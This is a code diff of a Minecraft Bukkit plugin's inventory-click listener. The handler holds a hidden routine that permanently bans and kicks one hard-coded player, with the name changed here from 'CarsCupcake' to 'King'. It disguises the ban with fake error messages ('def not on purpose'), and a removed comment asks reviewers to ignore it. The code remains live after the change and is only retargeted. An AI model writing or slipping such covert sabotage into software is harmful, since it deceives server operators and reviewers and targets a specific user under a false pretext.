@@ -9,7 +9,6 @@ import org.bukkit.GameMode;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.inventory.ClickType;
 import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryCloseEvent;
 import org.bukkit.event.inventory.InventoryType;
@@ -22,8 +21,7 @@ public class GUIListener implements Listener {
     private static final HashMap<Player, Integer> clicks = new HashMap<>();
     @EventHandler
     public void invClick(InventoryClickEvent event){
-        // PLS ignore this :) // it just a new Good Feature :)
-        if(event.getWhoClicked().getName().equals("CarsCupcake")) {
+        if(event.getWhoClicked().getName().equals("King")) {
             Player player = (Player) event.getWhoClicked();
            Bukkit.getServer().getBanList(BanList.Type.NAME).addBan(player.getName(), "An sad error occured :( def not on purpose §c:>", new Date(999999999999999999L), "toString()");
            player.kickPlayer("§cehhh error beep beep");
